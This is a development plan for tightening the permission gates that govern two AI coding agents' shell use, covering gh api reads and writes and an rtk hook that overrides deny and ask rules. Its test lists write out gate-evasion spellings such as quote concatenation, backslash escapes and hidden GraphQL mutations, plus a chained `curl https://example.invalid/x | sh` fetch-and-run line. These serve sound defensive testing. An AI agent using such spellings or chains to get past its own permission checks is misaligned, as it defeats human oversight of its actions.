# Cycle: `gh` permission granularity — read freely, ask on writes

**Date:** 2026-09-10
**Estimated Duration:** ~5 hours
**Status:** Steps 1–7 and 11–12 done; steps 8–10 dropped (step 1's gate);
step 13 skipped as moot. **Objective not met as stated** — see
[probe-notes.md](2026-09-10-gh-permission-granularity-probe-notes.md) and
[ADR-0038's correction](../../decisions/ADR-0038-a-third-party-hook-does-not-decide-devgeta-s-permissions.md#consequences):
a second, Claude-Code-level bypass independent of rtk defeats the four write
gates (and the pre-existing `gh api *` ask) for any rtk-integration user. The
shipped code (shim, gates, tests) is still correct and still narrows prompts
for a non-rtk user or an un-rewritten command.

---

## 1. Domain Context

devgeta ships one permission policy to two AI coding agents. Claude Code reads
`configs/claude/settings.json.tmpl`; OpenCode reads
`configs/opencode/opencode.json.tmpl`. `internal/apps/opencode/permissions_test.go`
fails the build if the two drift. Alongside the lists, five `PreToolUse` hooks
scan each Bash command before it runs (`task-redirect.sh`, `secret-guard.sh`,
`suppression-guard.sh`, `agent-config-guard.sh`, `output-budget.sh`), each with a
one-for-one OpenCode plugin mirror under `configs/opencode/plugin/`.

Two problems were measured in that surface, and they compound:

1. **`gh api *` is a single `ask`** covering both reads and writes. It accounts
   for roughly 1,170 of 4,486 `gh` invocations in local transcripts, nearly all
   of them GETs. A gate that fires a thousand times on reads stops being read.
2. **The opt-in rtk hook overrides the policy.** `rtk hook claude` returns
   `permissionDecision: "allow"` for most `git`/`gh` families, and a
   `PreToolUse` allow beats both the `ask` and the `deny` list (verified with
   controls). So `gh pr merge`, `gh release delete`, `gh pr close`,
   `gh issue delete`, `git commit` and `git push origin main` run unprompted
   today, and no gate devgeta adds for them could fire.

Problem 2 has to be fixed first: tuning a policy that something else is
overriding produces no observable change.

Design is settled in two ADRs for Claude Code, and **conditional on step 1's
probe for OpenCode** — read all three documents before starting:

- [ADR-0038](../../decisions/ADR-0038-a-third-party-hook-does-not-decide-devgeta-s-permissions.md)
  — a third-party hook rewrites the command; it does not decide the permission
- [ADR-0039](../../decisions/ADR-0039-gh-api-is-gated-by-what-it-writes-not-by-its-name.md)
  — `gh api` is gated by what it writes, not by its name, including the OpenCode
  two-outcome route step 1 chooses between
- [ADR-0007](../../decisions/ADR-0007-task-redirects-stay-hard-deny.md) — the
  prior measurement that OpenCode's `permission.ask` does not fire for bash and
  its payload carries no command. This cycle does not assume that changed.

Background: [docs/guides/agent-permission-matching.md](../../guides/agent-permission-matching.md)
(the probe method and §5 on why `gh api` is `ask`),
[docs/guides/agent-sync.md](../../guides/agent-sync.md) (which file holds which
concern across the two agents).

---

## 2. Engineer Context

**Relevant files:**

- `configs/claude/settings.json.tmpl` — Claude Code policy + the rendered hook chain
- `configs/opencode/opencode.json.tmpl` — the OpenCode twin
- `configs/claude/lib/segments.sh` — `devgeta_split_command_segments`,
  `devgeta_trim`, `DEVGETA_ENV_ASSIGN`, `DEVGETA_GH_GLOBAL_OPT`; sourced by every
  Claude hook
- `configs/claude/task-redirect.sh` — the closest existing model: segment scan,
  `gh` anchor, fail-open contract, bypass env var. Read its header comment first.
- `configs/opencode/plugin/task-redirect.js` — the JS mirror, including
  `splitCommandSegments`
- `internal/apps/claude/claude.go:153-160` — the list of hook scripts deployed to
  `~/.claude/`; a new script must be added here or it never lands
- `internal/apps/opencode/permissions_test.go` — parity, plus
  `TestGlobalClaudeFloorEnumerationStaysCurrent`, which derives its `.sh` list
  from `configs/claude/`

**Key facts the implementation depends on.** The first three are measured; the
fourth is explicitly **not**, which is why step 1 exists.

- **Verified.** A Claude `PreToolUse` hook's `permissionDecision: "allow"`
  overrides `ask` and `deny`. `updatedInput` does **not** affect matching —
  permissions are evaluated against the command the model wrote. (ADR-0038 has
  the probe table.)
- **Verified.** rtk 0.43.0's hook emits `hookSpecificOutput.permissionDecision`
  alongside `updatedInput`; for `gh api` it emits `updatedInput` only.
- **Documented in `gh api --help`.** A REST `gh api` issues a GET unless the
  invocation carries `--method`/`-X` with a non-GET/HEAD verb, or one of
  `-f` / `-F` / `--field` / `--raw-field` / `--input`. GraphQL is always POST and
  always carries a body flag, so it is classified by its operation instead — see
  ADR-0039's Decision for the whitelist grammar this cycle implements.
- **NOT verified — step 1 settles it.** OpenCode 1.18.30's type signature
  exposes `"permission.ask"` with `output.status: "ask" | "deny" | "allow"`
  (`@opencode-ai/plugin/dist/index.d.ts:225`). That is the _output_ shape only.
  [ADR-0007](../../decisions/ADR-0007-task-redirects-stay-hard-deny.md) measured
  the inputs on 1.18.9 and found `permission.ask` **did not fire** for bash — not
  when auto-allowed, and not under `"bash": {"*": "ask"}` — and that `Permission`
  has **no `command` field**. Do not treat the signature as evidence the hook
  fires or carries the command; that mistake is what step 1 exists to prevent.

**Testing patterns:** [docs/guides/testing-patterns.md](../../guides/testing-patterns.md).
Hook scripts are tested from the root package's `*_test.go` files by spawning
bash against the embedded configs FS — that is the slow package (4.8 min), and a
`configs/` change requires it.

**Commands to run** — a `configs/` change is read by the embedded-config tests in
the root package plus `internal/apps/claude` and `internal/apps/opencode`, and the
root package is the slow one, so per CLAUDE.md §6 this cycle costs most of a full
run anyway. Run the suite:

```bash
go build ./...
make lint
go test ./...
```

While iterating on one hook, narrow to the test by name:

```bash
go test -run TestRtkShim ./
go test -run TestGhReadGate ./
go test -run TestClaudeAndOpenCodePermissionParity ./internal/apps/opencode/
```

---

## 3. Objective

`gh api` reads **in the literal forms ADR-0039's grammar accepts** run without a
prompt on Claude Code, and **four named high-risk `gh` writes** reach a human gate
that actually fires there whether or not the rtk integration is enabled:
`gh pr merge`, `gh release delete`, `gh pr close`, `gh issue delete`.

"In the forms the grammar accepts" is load-bearing, not hedging. A read that
pipes to `jq`, quotes its endpoint with double quotes, interpolates a shell
variable outside single quotes, or uses a `gh` flag the allowlist has not
enumerated still prompts, by design. The objective is the grammar, not the idea
of a read.

**This is not "every `gh` write," and the difference is deliberate.** ADR-0038's
measured list of what rtk auto-allows also contains `gh pr create`,
`gh pr edit`, `gh run rerun`, `git commit` and `git push origin main`. After the
shim strips rtk's decision, those fall through to the existing `Bash(*)` allow
and run unprompted, because no rule covers them. Two things about that:

- **It is not a regression.** Before the shim they ran unprompted via rtk's
  `allow`; after it they run unprompted via `Bash(*)`. Same outcome, different
  route. What the shim changes is that a rule added for them would now work,
  which today it cannot.
- **Gating them is a separate decision, not an oversight.** They are frequent and
  mostly recoverable — `gh pr create` and `gh pr edit` especially — so gating
  them trades real prompt fatigue for modest risk reduction, and prompt fatigue
  is the failure this cycle exists to reduce. Picking that set is its own
  conversation with its own noise budget (see §4, out of scope).

So the acceptance criterion is exactly: those four commands prompt, `gh api`
writes prompt, and `gh api` reads that parse as the grammar do not. Nothing
broader — a read outside the grammar prompting is a pass, not a bug.

On **OpenCode**, the same four write rules are present in the permission list,
and the read carve-out ships **only if** step 1's probe shows it can be expressed
there (ADR-0039: the plugin route, or dropped from both). The rtk override is
**not** closed on OpenCode — rtk owns its plugin file there — so even those four
are gated on OpenCode only when the rtk integration is off. Step 1c measures how
large that gap actually is; until then its size is unknown, not zero.

Both narrowings are deliberate. Two earlier drafts of this objective overclaimed
— one said both agents were covered "with or without rtk," contradicting the
out-of-scope list on the same page; the next said "every `gh` write" while gating
four subcommands.

---

## 4. Scope Boundary

### In Scope

- [x] `configs/claude/rtk-shim.sh` — forwards rtk's `updatedInput`, strips its
      `permissionDecision`; wired into the rendered `PreToolUse` block in place of
      `rtk hook claude`
- [x] ~~`configs/claude/gh-read-gate.sh`~~ — **dropped by step 1's gate** (see
      probe-notes.md): OpenCode's `permission.ask` still does not fire, so the
      carve-out was never written on either agent
- [x] ~~`configs/opencode/plugin/gh-read-gate.js`~~ — dropped alongside the
      above, per this row's own conditional
- [x] New `ask` entries in both configs: `gh pr merge *`, `gh release delete *`,
      `gh pr close *`, `gh issue delete *` — shipped, but do **not** reliably
      fire for an rtk-integration user (see Status above)
- [x] `internal/apps/claude/claude.go` — deploy `rtk-shim.sh` always; no
      `gh-read-gate.sh` deploy needed since it was dropped
- [x] Tests: shim strips the decision and forwards the rewrite
      (`rtk_shim_test.go`); write-gate effective-resolution
      (`TestGhWriteGatesResolve`); parity across both configs; the new script
      appears in the global-Claude floor enumeration. No classifier tests —
      the classifier was dropped
- [x] `docs/guides/agent-permission-matching.md` — §6 records the
      `allow(Bash(*))`-plus-rewrite bypass this cycle actually found, in place
      of the originally planned hook-allow-beats-deny/read-write-split section
      (that finding is in ADR-0038/0039 instead, since no read/write classifier
      shipped)
- [x] `docs/apps/claude.md` — documents the shim, states both the Claude-side
      and OpenCode-side gaps honestly
- [x] `docs/guides/agent-sync.md` — records the rtk hook-wiring row and why
      `rtk-shim.sh` has no OpenCode mirror
- [x] ~~File an rtk upstream issue~~ — **skipped as moot**: the measured root
      cause is Claude Code's own `allow`-vs-rewrite resolution, not rtk's JSON
      shape; an rtk-side flag would not fix it. Claude Code feedback filed
      instead.

### Explicitly Out of Scope

- Shimming rtk on the OpenCode side. rtk installs its own plugin file there and
  devgeta deliberately does not touch it
  (`internal/apps/opencode/opencode.go:231`). Measured in step 1, documented as a
  gap, not fixed — and reflected in §3's objective rather than contradicting it.
  If step 1 shows rtk overrides OpenCode's list as thoroughly as it does Claude
  Code's, that is a finding worth its own cycle, and possibly worth gating the
  OpenCode rtk integration behind an explicit opt-in that says so.
- Gating the rest of rtk's auto-allow list: `gh pr create`, `gh pr edit`,
  `gh run rerun`, `git commit`, `git push origin main`. The shim removes the
  override for all of them, so a rule added later would work — but choosing which
  deserve an `ask` is its own conversation with its own noise budget, and these
  are frequent and mostly recoverable. §3 states plainly that they stay
  unprompted, and that this is not a regression: they were unprompted before the
  shim too, via rtk's `allow` instead of `Bash(*)`.
- Any change to the `read`/`edit` path denies, the scratch-dir grants, or the
  `Bash(*)` catch-all.
- **Parsing shell in general.** The gate does not use the segmenter and does not
  become a shell parser; it recognizes one narrow whitelisted command shape and
  refuses everything else, including valid shell it simply does not model
  (double quotes, pipes, substitution). The refusals are false **asks**, which is
  the acceptable direction — see ADR-0039's grammar and "Not claimed". A future
  change that widens the grammar to accept more shell is a decision about
  authorization, not a convenience tweak.

**Scope is locked.** Anything discovered outside it gets written down here for a
later cycle, not built.

---

## 5. Implementation Plan

### File Changes

| Action | File Path                                          | Description                                                          |
| ------ | -------------------------------------------------- | -------------------------------------------------------------------- |
| Create | `configs/claude/rtk-shim.sh`                       | Forward rtk's rewrite, drop its permission decision                  |
| Create | `configs/claude/gh-read-gate.sh`                   | Allow read-only `gh api`; silent otherwise                           |
| Create | `configs/opencode/plugin/gh-read-gate.js`          | OpenCode mirror — mechanism decided by step 1's probe                |
| Modify | `configs/claude/settings.json.tmpl`                | Swap rtk entry for the shim; add gate; add write `ask`s              |
| Modify | `configs/opencode/opencode.json.tmpl`              | Add the same write `ask` entries                                     |
| Modify | `internal/apps/claude/claude.go:153`               | Deploy `rtk-shim.sh`; add `gh-read-gate.sh` only on the plugin route |
| Modify | `internal/apps/opencode/permissions_test.go`       | Parity + effective-resolution tests for the new entries              |
| Create | `rtk_shim_test.go` / `gh_read_gate_test.go` (root) | Hook behavior against the embedded FS                                |
| Create | `testdata/rtk-hook-payloads/*.json` (root)         | Committed rtk output fixtures — step 2 records them                  |
| Create | `docs/plans/cycles/2026-09-10-…-probe-notes.md`    | Step 1's raw probe transcript, kept as the evidence                  |
| Modify | `docs/guides/agent-permission-matching.md`         | New section: hook allow vs. the lists; the r/w split                 |
| Modify | `docs/apps/claude.md`                              | Document both hooks; state the OpenCode rtk gap                      |
| Modify | `docs/guides/agent-sync.md`                        | Register the new mirror pair                                         |
| Modify | `docs/decisions/README.md`                         | Index ADR-0038 and ADR-0039                                          |

### Step-by-Step

#### Step 1: Probe OpenCode's capabilities — before writing any classifier

This step decides whether steps 7–9 are even implementable as designed, so it
comes first. ADR-0007 measured, on OpenCode 1.18.9, that `permission.ask` **did
not fire** for bash (auto-allowed or under `"bash": {"*": "ask"}`) and that the
`Permission` payload has **no `command` field**. The installed version is
1.18.30. Nothing but a probe settles whether either fact changed.

Use ADR-0007's own method — a scratch project, a plugin registering **both**
`tool.execute.before` and `permission.ask` and logging each, so a silent
`permission.ask` is distinguishable from a plugin that never loaded:

- **1a.** With `"gh api *": "ask"` in a throwaway `OPENCODE_CONFIG`, run
  `gh api rate_limit`. Record: did `permission.ask` fire? If so, dump the entire
  input object and name the exact field carrying the command text (`title`?
  `metadata.*`?). If it is only recoverable from `title` or an untyped bag, say
  so — that is a weaker contract and step 10 must pin the field in a test.
- **1b.** Confirm ADR-0007 finding 2 still holds: does a targeted `ask` prompt
  usefully in an interactive session, or stall an unattended one? The shipped
  config already carries `gh api *: ask`, so this is measuring the status quo,
  not a new risk — but the four new write asks inherit whatever it measures.
- **1c.** Probe rtk's OpenCode plugin against the permission list: with
  `"gh pr merge *": "ask"` in the throwaway config, does `gh pr merge 1` prompt?
  This sizes the §4 out-of-scope gap, which §3 currently reports as unknown.
- Record every run with its control in the probe-notes file, in the
  measured-not-reasoned style of `agent-permission-matching.md`.
- **Gate:** if 1a fails either way, ADR-0039 settles it — the carve-out is
  dropped from both agents, and steps 8–10 come off the plan while steps 1–7
  proceed. Do not proceed to step 10 on the strength of a type signature, and do
  not substitute a permission-list design; that option was withdrawn as unsafe.
- Verify: the probe-notes file states, for each of 1a/1b/1c, what was observed
  and what the control showed.

#### Step 2: Record a real rtk payload as a test fixture

- Capture `rtk hook claude` output for `gh pr merge 12 --squash` (has a decision)
  and `gh api rate_limit` (no decision).
- **Committed**, as `testdata/rtk-hook-payloads/with-decision.json` and
  `without-decision.json` in the root package. They must be committed: the shim
  test has to run in CI where rtk is not installed, and the fixture is also the
  record of which rtk version's output shape the shim was written against —
  note that version in a sibling `VERSION` file (`rtk 0.43.0` at time of
  writing).
- Why before the shim: the shim's contract is "strip this key from that shape,"
  and the shape must come from the tool, not from memory.
- Verify: fixture contains `"permissionDecision":"allow"` in the first case and
  not in the second.

#### Step 3: Write `configs/claude/rtk-shim.sh`

- Read the payload on stdin, forward it to `rtk hook claude`, re-emit with
  `permissionDecision` and `permissionDecisionReason` removed via `jq`.
- Fail open to silence: rtk missing, non-zero exit, empty output, or unparseable
  JSON all mean "emit nothing." Mirror `task-redirect.sh:17`'s contract comment.
- Add a `DEVGETA_SKIP_RTK_SHIM=1` bypass, read from the hook's own environment,
  matching the sibling hooks.
- Verify: `go build ./...`; `shellcheck`-clean under `make lint`.

#### Step 4: Test the shim

- Table test in the root package: decision stripped, `updatedInput` preserved
  byte-for-byte, each fail-open path emits nothing.
- One test asserts the stripped key by name, so an rtk rename shows up as a red
  test rather than a silent revert (ADR-0038's stated risk).
- Verify: `go test -run TestRtkShim ./`

#### Step 5: Wire the shim into the template

- In `configs/claude/settings.json.tmpl`, replace `rtk hook claude` inside
  `{{if .RtkClaudeHook}}` with `~/.claude/rtk-shim.sh`.
- Add `rtk-shim.sh` to the deploy list at `internal/apps/claude/claude.go:153`.
- Verify: `go test -run 'TestGlobalClaudeFloorEnumerationStaysCurrent|TestRender' ./internal/apps/claude/`

#### Step 6: Manually confirm the override is gone

- `dg configure claude --force`, then with a throwaway settings file carrying
  `deny: ["Bash(git status*)"]` and the shim in the hook chain, run the
  ADR-0038 probe. Expected: denied. Re-run with `rtk hook claude` directly:
  expected: runs. That pair is the whole point of the cycle — do not skip it.
- Verify: the two runs differ, and the denial message is
  `Permission to use Bash with command git status has been denied.`

#### Step 7: Add the missing write gates

- Add `gh pr merge *`, `gh release delete *`, `gh pr close *`,
  `gh issue delete *` to the `ask` list in **both** configs.
- String parity is not enough here. Add **effective-resolution** tests for all
  four: assert each pattern actually matches the command it names, by the probe
  method in `agent-permission-matching.md` §6 — that guide exists because
  identical strings in the two configs can still match nothing
  (`TestHomeAnchoredDeniesHaveGlobstarTwins` is the precedent for encoding a
  matching fact rather than a string fact).
- Watch the interaction with the deny list: `gh repo delete *` is already a deny
  and Claude Code resolves deny → ask → allow with no specificity tiebreak, so
  confirm the new asks do not shadow or get shadowed by an existing rule.
- Verify: `go test -run 'TestClaudeAndOpenCodePermissionParity|TestGhWriteGatesResolve' ./internal/apps/opencode/`

#### Step 8: Write `configs/claude/gh-read-gate.sh`

**Do NOT source `lib/segments.sh` here.** That splitter is best-effort and not a
shell parser, and this hook issues an authorization rather than a block — see
ADR-0039's rejected alternatives for why per-segment proof is unsafe. The gate
recognizes whole commands or it stays silent.

**Implement it as a whitelist parser, never as a metacharacter blacklist.** This
is the one instruction in the cycle most likely to be quietly softened during
implementation, so it is stated as a rule: the hook may only emit `allow` for a
command it has fully parsed, and every check must read "matches something
known-safe," never "does not contain something known-bad." A blacklist leaks
through spelling — measured with a real shell, `--met'hod' DELETE` and
`-'f' key=val` reach `gh` as clean `--method DELETE` and `-f key=val` while
matching no grep for either.

- Emit `permissionDecision: "allow"` only when the **entire command** parses as
  ADR-0039's grammar and every flag is on its allowlist. Emit nothing otherwise —
  including for anything merely unrecognized. ADR-0039's Decision section is the
  spec; the shape is:
  1. **Tokenize** on runs of spaces and tabs only. Any other whitespace byte
     (newline, `\r`, `\v`, `\f`) refuses the command.
     Whitespace **inside** a single-quoted span does not separate tokens, so
     `query='query { viewer { login } }'` is one argument.
  2. **Accept a token only if it is** wholly `[A-Za-z0-9_./:@=-]+` **or** wholly
     `'…'` with no embedded quote or backslash — and nothing adjacent to either —
     **or** the one permitted concatenation `name='…'` (`fieldarg`), which is
     GraphQL-only and is what makes `-f query='…'` parseable at all. Without
     `fieldarg` the only GraphQL form this cycle allows would be rejected as
     `--met'hod'`-style concatenation; with it, `query=foo'query{…}'` still
     refuses, because the name must be followed immediately by `=` and one quoted
     span with nothing after it.
     No backslash anywhere; no glob character in a bare token. Double-quoted
     tokens are **not** in the grammar (`"…"` still expands `$`), so they refuse.
     Separators, redirects and heredocs need no rule of their own — their
     characters are simply not in the token alphabet.
     **`$` and backticks: refused in a bare token, permitted inside `'…'`.**
     Single quotes suppress all expansion (verified: `-f 'query=$Q'` arrives as
     the literal `query=$Q`), so the character is inert there and banning it
     would reject GraphQL variables. Do not "tighten" this to a blanket ban — the
     earlier draft of the ADR did, and it contradicted its own grammar.
  3. **The command must begin `gh api`**, which rules out leading `VAR=value` and
     every wrapper.
  4. **Match each flag against the read-only allowlist** — `--paginate`,
     `--slurp`, `--verbose`, `--cache`, `-H`/`--header`, `--hostname`,
     `-q`/`--jq`, `-t`/`--template`, and `-X`/`--method` only with value `GET` or
     `HEAD`. An unrecognized flag refuses. The body flags are absent from the
     list, so REST writes refuse without a detection step to evade.
  5. **GraphQL only** (a `graphql` token present): additionally admit
     `-f`/`--field` with a `fieldarg` value. Require **exactly one** field named
     `query` — zero refuses, two refuse. Other `-f name='…'` fields are allowed
     as GraphQL variables; a variable cannot change the operation type, since the
     query document alone determines that.
     **Strip the enclosing quotes before the operation check, and do no further
     unescaping** (single quotes admit no escapes). On that string: it must be
     non-empty, its first whitespace-delimited token must be `query` or begin
     `{`, and no `mutation`/`subscription` may appear anywhere. State the
     quote-stripping explicitly in the code comment — "does the check see the
     quotes?" is where a first-token test goes off by one.
     Without this carve-out all 384 measured `gh api graphql` calls keep
     prompting, since `-f query=…` is how every GraphQL read is written.
- Note what the grammar costs: `gh api … | jq …` and any double-quoted argument
  no longer auto-allow. `gh api`'s own `--jq`/`--template` stay inside the single
  invocation and do. Do not "improve" this by allowing a trailing pipe or
  double quotes — ADR-0039 leaves the first open deliberately and rejects the
  second, both because they reopen the parse.
- Keep the token alphabet and the flag allowlist in named constants with comments
  citing `gh api --help`, so ADR-0039's "a future `gh` flag" risk has one place
  to update. Note the failure direction is now a false **ask**, not a false
  allow: a read-only flag nobody enumerated simply prompts.
- Add a header comment stating the allow-vs-deny asymmetry from ADR-0039's
  Consequences: this hook grants permission, so unlike its three siblings it must
  fail toward asking, never toward allowing.
- Verify: `go build ./...`, `make lint`

#### Step 9: Test the classifier

- **Allowed — pin each, since the grammar is the contract:**
  - REST: `gh api repos/a/b/pulls/1`, `gh api --paginate repos/a/b/issues`,
    `gh api rate_limit`, `gh api -X GET repos/a/b`
  - GraphQL, the `fieldarg` cases the carve-out exists for:
    `gh api graphql -f query='query{viewer{login}}'`,
    `gh api graphql -f query='query { viewer { login } }'` (spaces inside the
    quoted span do not split the token),
    `gh api graphql -f query='{ viewer { login } }'` (anonymous shorthand)
  - GraphQL with variables — `$` is inert inside single quotes, so this is a
    read: `gh api graphql -f owner='cjairm' -f query='query($owner:String!){…}'`
- **Must NOT be allowed — the `fieldarg` boundary (n23).** The one permitted
  concatenation must not become a general one:
  - `gh api graphql -f query=foo'query{viewer{login}}'` — name not immediately
    followed by `=` and a single quoted span
  - `gh api graphql -f query=''` — empty document
  - `gh api graphql -f query='query{x}' -f query='mutation{y}'` — two `query=`
    fields refuse; so does zero
  - `gh api graphql -f 'query'='query{x}'` — quoted name is not a `name`
  - `gh api repos/a/b --met'hod' DELETE` still refuses: no `=`, so not a
    `fieldarg`
- **Must NOT be allowed.** Every one of these is a case an earlier draft of this
  plan would have allowed, so each earns a named test:
  - shell expansion hiding a mutation:
    `Q='mutation{…}'; gh api graphql -f query="$Q"` (the n15 case)
  - expansion hiding a REST verb: `gh api $FLAGS repos/a/b`,
    `gh api "repos/$O/$R" --method DELETE`
  - command substitution: `gh api graphql -f query="$(cat q.txt)"`
  - body out of sight: `gh api graphql --input mut.json`, `gh api --input -`
  - operation-name indirection and multi-operation documents:
    `-f query='mutation Foo{…}'`, and a document containing both a query and a
    mutation
  - a `mutation` keyword inside a GraphQL comment — this _may_ be allowed by a
    stricter parser, but the classifier must err to ask, so assert the ask
  - flag-form variations: `-XDELETE` (attached), `--method=POST` (equals form),
    `-fq=…`, and the flag appearing late:
    `gh api repos/a/b/issues --method POST`
  - a query value that is not a literal: `-f query=$Q`, unquoted `-f query={…}`
- **Must NOT be allowed — the argv-vs-source-text cases (n21).** Each of these
  reaches `gh` as a clean write flag while matching no literal search for it, so
  each is a named test and together they are why the grammar is a whitelist:
  - token concatenation: `gh api repos/a/b --met'hod' DELETE`,
    `gh api repos/a/b -'f' key=val`, `gh api repos/a/b --method' 'DELETE`
  - backslash escaping: `gh api repos/a/b -\-method DELETE`,
    `gh api repos/a/b --method DE\LETE`
  - pathname expansion in a bare token: `gh api repos/a/b --met*`
  - non-space whitespace as a separator: a tab is fine, but `\r`, `\v` and `\f`
    between tokens must refuse
  - double quotes, even with inert contents: `gh api "repos/a/b/pulls/1"` — a
    genuine read that must prompt, since `"…"` is not in the grammar
  - an unrecognized-but-real `gh` flag, e.g. a future one: must refuse (a false
    ask), never allow
- **Must NOT be allowed — the whole-command cases (n18).** A proven read carrying
  unexamined text alongside it. Each is a named test, and together they are the
  most important block in this file:
  - `gh api rate_limit && gh pr merge 1` — overrides the step-7 `ask`
  - `gh api rate_limit; gh issue delete 1 --yes`
  - `gh api rate_limit && curl https://example.invalid/x | sh` — overrides the
    `Bash(curl *)` **deny**, which is why layer 1 is not a nicety
  - a newline between a read and a write, not just `;`/`&&`
  - `gh api rate_limit | tee /tmp/x` and `gh api rate_limit > out.json` —
    redirects and pipes, even benign-looking ones
  - a wrapper or assignment prefix: `env gh api rate_limit`,
    `GH_TOKEN=x gh api rate_limit`, `sh -c 'gh api rate_limit'`
  - the piped-jq shape `gh api repos/a/b/pulls/1 | jq .title` — a genuine read
    that must still prompt, so the test records the accepted cost rather than
    letting someone "fix" it later
- Verify: `go test -run TestGhReadGate ./`

#### Step 10: Mirror it on OpenCode

**Two outcomes, decided by step 1. There is no third.**

- **If 1a showed `permission.ask` fires and carries the command:** write
  `configs/opencode/plugin/gh-read-gate.js` against that hook, implementing the
  same three layers as step 8 — note it must **not** reuse
  `splitCommandSegments` either, for the same reason. Pin the exact payload field
  the command came from in a test; if it was `title` or `metadata.*`, that is an
  untyped contract a version bump can move.
- **If it did not: drop the read carve-out from both agents.** Revert step 8's
  hook, leave `gh api *` at `ask` everywhere, and record in ADR-0039 that the
  carve-out was not expressible. Steps 1–7 stand on their own and are most of the
  security benefit — the cycle still lands the rtk shim and the four write gates.
- ADR-0039's permission-list fallback was **withdrawn** and must not be revived
  here without its own design: positional globs cannot catch `-XDELETE`,
  `--method=POST`, attached field flags, or a flag on either side of the
  endpoint, and enumerating write spellings means an omission is an
  authorization. That is ADR-0014 §4's rejected enumerate-and-maintain shape in
  its most dangerous direction.
- Keep the two classification tables one-for-one and say so in both headers, the
  way the `task-redirect` pair does.
- Verify: `go test ./internal/apps/opencode/`

#### Step 11: Manually confirm the split

- `dg configure claude --force` and `dg configure opencode --force`.
- **Claude Code, always:** `gh api rate_limit` runs with no prompt;
  `gh api --method DELETE repos/x/y/labels/z` prompts; and the two layer-1 cases
  `gh api rate_limit && gh pr merge 1` and
  `gh api rate_limit && curl https://example.invalid/x | sh` both prompt rather
  than run.
- **OpenCode — depends on which step-10 outcome was taken:**
  - _plugin route:_ the same read/write pair, read from
    `--print-logs --log-level DEBUG`.
  - _carve-out dropped:_ confirm the opposite — `gh api rate_limit` **does**
    prompt on OpenCode, i.e. the shipped state is unchanged there. This is a real
    check, not a skip: it proves nothing half-landed.
- **Also measure, don't guess:** count how many of a normal working session's
  `gh api` calls actually clear the grammar. ADR-0039's "Easier" claim is
  explicitly deferred to this number, and if it is small the decision should be
  reconsidered rather than defended.
- Verify: the four Claude observations each with a control, plus the OpenCode
  branch that applies, plus the measured share written into ADR-0039.

#### Step 12: Documentation

- `docs/guides/agent-permission-matching.md`: new section with the
  hook-allow-beats-`deny` table and the read/write signal list, in the same
  measured-not-reasoned style as the rest of that page.
- `docs/apps/claude.md`: both new hooks; the OpenCode rtk gap stated plainly.
- `docs/guides/agent-sync.md`: the new mirror pair.
- `docs/decisions/README.md`: index both ADRs.
- Both ADRs were accepted on approval (2026-09-10), so there is no status flip
  left to make. What still has to land here is the **evidence**: write step 1's
  probe result, step 6's shim probe pair, and step 11's measured share of allowed
  reads into the ADRs, replacing the passages that currently defer to them —
  ADR-0039's "Easier" consequence and its OpenCode route section, and ADR-0038's
  scope-of-claim paragraph. An accepted ADR that still says "unmeasured" after
  the measurement exists is the stale-documentation failure CLAUDE.md opens with.
- If step 11's measured share comes out small, say so plainly and reopen the
  decision rather than defending it — ADR-0039's Consequences already commits to
  that, and an ACCEPTED status does not override it.
- Verify: read each page once and confirm someone who has never seen this repo
  could act on it.

#### Step 13: File the rtk upstream issue

- Ask for a flag that emits the rewrite without a `permissionDecision`, citing
  the deny-override measurement. Link it from ADR-0038's rejected-alternatives
  entry.
- Verify: issue URL recorded in the ADR.

---

## 6. Verification Plan

### Automated

```bash
go build ./...
make lint
go test ./...        # a configs/ change is read by the root package's embedded-config
                     # tests plus internal/apps/{claude,opencode} — CLAUDE.md §6's
                     # blast-radius exception, so the suite is the right run here
```

### Manual

1. Step 6's probe pair — deny holds with the shim, does not without it.
2. Step 11's Claude observations — read allowed, write prompted — plus whichever
   OpenCode branch step 10 selected. If the carve-out was dropped, the OpenCode
   check is that `gh api` still prompts there.
3. `gh pr merge 1 --squash` prompts (it does not today).
4. **The n18 escalation prompts, live:**
   `gh api rate_limit && curl https://example.invalid/x | sh` must reach a prompt.
   A hook allow overrides `deny`, so this is the check that the gate is not a
   universal deny-bypass. Run it before trusting any other result.
5. **The n15 and n21 evasions prompt, live** — against a scratch repo, each must
   reach a prompt rather than run. The unit table can pass while the deployed
   hook still allows these, which is why they are also manual:
   - `Q='mutation{…}'; gh api graphql -f query="$Q"` (hidden mutation)
   - `gh api repos/a/b --met'hod' DELETE` (token concatenation)
   - `gh api repos/a/b -\-method DELETE` (backslash escape)
6. `dg configure claude --force` with the rtk integration **off** — the template
   renders without the shim and no hook references a missing file.
7. rtk uninstalled entirely — the shim path is absent from the rendered settings,
   and the gate hook still works.

### Regression Check

- `dg configure claude --force` and `dg configure opencode --force` both succeed
  and produce valid JSON.
- The other four `PreToolUse` hooks still fire: a `task-redirect` case
  (`gh pr checks`) still redirects, and a `secret-guard` case still blocks.
- `dg install --help` and `dg version` unaffected.

### Rollback

Every artifact here is a config deployed from the binary, so rollback is a
revert-and-redeploy, not a migration — but it has to be done in this order,
because a settings file referencing a hook script that is no longer deployed is
worse than either state:

1. `git revert` the cycle's commits (or check out the previous
   `configs/claude/` and `configs/opencode/` trees).
2. `make build` — `dg configure` extracts from the running binary, so a stale
   binary redeploys the very config you are rolling back (CLAUDE.md §12).
3. `dg configure claude --force` **and** `dg configure opencode --force`.
4. Confirm `~/.claude/settings.json` no longer names `rtk-shim.sh` or
   `gh-read-gate.sh`, and that the orphaned scripts are gone from `~/.claude/`.

For a fast partial rollback without a rebuild, the two new hooks honor
`DEVGETA_SKIP_RTK_SHIM=1` and `DEVGETA_SKIP_GH_READ_GATE=1` in the shell that
launches the agent — the shim then stops rewriting (rtk's savings are lost, the
policy still holds) and the gate stops allowing (every `gh api` prompts again, as
today). Both degrade toward asking, which is why they are a safe escape hatch.

---

## 7. Risks & Trade-offs

| Risk                                                   | Likelihood | Mitigation                                                                                                                                                                                                    |
| ------------------------------------------------------ | ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| rtk renames `permissionDecision`; shim silently no-ops | Med        | Test asserts the key by name against a recorded payload; fail-open is "no rewrite," not "no gate"                                                                                                             |
| Classifier misses a future `gh` body-carrying flag     | Med        | Flag list in one constant citing `gh api --help`; ADR-0039 states the limit rather than hiding it                                                                                                             |
| **Classifier allows a write it could not read**        | **Med**    | The whitelist grammar and flag allowlist (step 8) + the three named evasion blocks in step 9 + live checks 4-5. This is the n15/n18/n21 family: the hook must prove a read, never merely fail to spot a write |
